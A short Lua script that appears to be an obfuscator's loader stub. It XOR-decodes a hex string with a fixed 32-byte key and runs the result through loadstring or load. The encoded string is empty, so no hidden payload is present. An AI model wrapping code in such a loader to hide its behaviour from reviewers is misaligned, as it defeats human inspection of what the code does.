local k={180,54,62,253,250,29,66,105,56,138,76,252,181,247,231,240,251,47,49,219,152,102,216,174,219,248,103,171,16,136,134,208}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
